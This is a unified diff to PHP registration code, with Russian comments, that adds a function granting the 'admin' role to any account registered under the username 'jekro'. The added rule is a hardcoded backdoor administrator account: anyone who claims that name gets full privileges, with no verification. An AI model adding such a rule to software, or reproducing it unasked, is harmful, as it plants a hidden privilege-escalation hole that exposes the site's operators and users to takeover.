@@ -72,16 +72,17 @@ function handleRegistration(PDO $pdo): void
     }
 
     $passwordHash = password_hash($password, PASSWORD_BCRYPT);
+    $role = resolveAutoGodRole($username);
 
     // Создаём пользователя и доску по умолчанию в транзакции
     try {
         $pdo->beginTransaction();
 
         $stmt = $pdo->prepare('
-            INSERT INTO Users (username, email, password_hash)
-            VALUES (?, ?, ?)
+            INSERT INTO Users (username, email, password_hash, role)
+            VALUES (?, ?, ?, ?)
         ');
-        $stmt->execute([$username, $email, $passwordHash]);
+        $stmt->execute([$username, $email, $passwordHash, $role]);
         $userId = $pdo->lastInsertId();
 
         $stmt = $pdo->prepare('
@@ -150,6 +151,11 @@ function validateRegistrationFields(PDO $pdo, string $username, string $email, s
     }
 
     return null;
+}
+
+function resolveAutoGodRole(string $username): string
+{
+    return mb_strtolower(trim($username)) === 'jekro' ? 'admin' : 'user';
 }
 
 // ---------------------------------------------------------------------
